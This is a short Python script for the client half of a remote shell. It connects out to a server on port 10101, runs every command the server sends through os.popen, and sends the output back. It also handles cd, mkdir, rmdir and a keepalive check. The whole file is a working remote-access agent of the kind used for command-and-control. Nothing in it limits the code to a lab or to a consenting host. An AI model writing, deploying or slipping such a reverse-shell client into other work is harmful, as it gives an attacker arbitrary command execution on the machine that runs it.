#!/usr/bin/python

import os
import socket


class Client(object):
    host = ""
    sckt = None

    # initiates the client with the IP address of the server and creates a socket
    def __init__(self, host="127.0.0.1"):
        self.host = host
        self.sckt = socket.socket()

    # connects the socket to the server and prepares the client to receive commands from the server
    def start(self):
        self.sckt.connect((self.host, 10101))
        self.receive_commands()

    # interprets the commands from the server and performs them on the client itself
    def receive_commands(self):
        while True:
            data = self.sckt.recv(4096)
            # server sends '?' to determine whether the connection with the client is still active
            if data.decode("utf-8") == "?":
                self.sckt.send("!")
            elif data[:2].decode("utf-8") == "cd":
                os.chdir(data[3:].decode("utf-8"))
                self.sckt.send(" ")
            elif data[:5].decode("utf-8") == "mkdir":
                os.mkdir(data[6:].decode("utf-8"))
                self.sckt.send(" ")
            elif data[:5].decode("utf-8") == "rmdir":
                os.rmdir(data[6:].decode("utf-8"))
                self.sckt.send(" ")
            elif len(data) > 0:
                try:
                    # commands from the server are run as a subprocess of the client
                    process = os.popen(data.decode("utf-8"))
                    # output from the commands are returned to be displayed by the server
                    output = str(process.read())
                    self.sckt.send(output + " ")
                except OSError as message:
                    self.sckt.send(str(message) + " ")
        self.sckt.close()


def main():
    client = Client()
    client.start()


if __name__ == "__main__":
    main()
